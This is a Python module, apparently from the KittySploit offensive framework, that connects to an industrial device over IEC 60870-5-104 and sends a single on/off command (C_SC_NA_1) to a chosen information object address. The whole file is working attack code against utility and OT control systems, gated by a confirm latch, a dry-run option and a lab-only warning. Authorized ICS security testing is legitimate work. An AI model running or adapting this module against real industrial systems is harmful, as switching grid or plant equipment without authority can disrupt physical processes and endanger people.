#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.iec104_client import Iec104Client
from lib.protocols.ics.ics_session_mixin import Iec104SessionMixin


class Module(Post, Ics_scanner_client, Iec104SessionMixin):
    __info__ = {
        "name": "IEC104 single command",
        "description": (
            "Sends an IEC 60870-5-104 single command (C_SC_NA_1). "
            "Intrusive — ot_policy gated + confirm latch."
        ),
        "author": "KittySploit Team",
        "tags": ["ics", "iec104", "utilities", "command"],
        "session_type": [SessionType.IEC104, SessionType.SHELL],
        "platform": Platform.MULTI,
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {"capabilities_any": ["ot_assets", "iec104"]},
            "chain": {
                "produces_capabilities": [],
                "consumes_capabilities": ["iec104"],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["iec104"], "IEC104 TCP port", True)
    common_address = OptInteger(1, "Common address (CA)", False)
    ioa = OptInteger(1, "Information object address (IOA)", True)
    value = OptBool(True, "Command value ON/OFF", True)
    select = OptBool(False, "Send select before execute", False)
    dry_run = OptBool(False, "Describe only — do not send", False)
    confirm = OptBool(False, "Must be True to send (safety latch)", True)

    def check(self):
        if self._resolve_session():
            return True
        return bool(self._host())

    def run(self):
        ioa = int(self.ioa)
        on = bool(self.value)
        select = bool(self.select)

        if bool(self.dry_run):
            print_success(
                f"Dry run — would C_SC_NA_1 IOA={ioa} value={int(on)} select={select}"
            )
            return True

        if not bool(self.confirm):
            print_error("Set confirm=true to send IEC104 single command (lab only)")
            return False

        print_warning("Only run against authorized utility/OT lab systems")
        owns_client = False
        try:
            client = self.open_iec104()
            if int(self.common_address or 0):
                client.common_address = int(self.common_address)
        except Exception:
            host = self._host()
            if not host:
                print_error("IEC104 session or target is required")
                return False
            client = Iec104Client(
                host, self._port(), self._timeout(), int(self.common_address or 1)
            )
            if not client.connect():
                print_error("Connection failed")
                return False
            owns_client = True

        try:
            if not client.startdt():
                print_error("STARTDT not confirmed")
                return False
            if client.single_command(ioa, on, select):
                print_success(f"Single command sent IOA={ioa} value={int(on)}")
                return True
            print_error("Single command failed")
            return False
        finally:
            if owns_client:
                client.close()
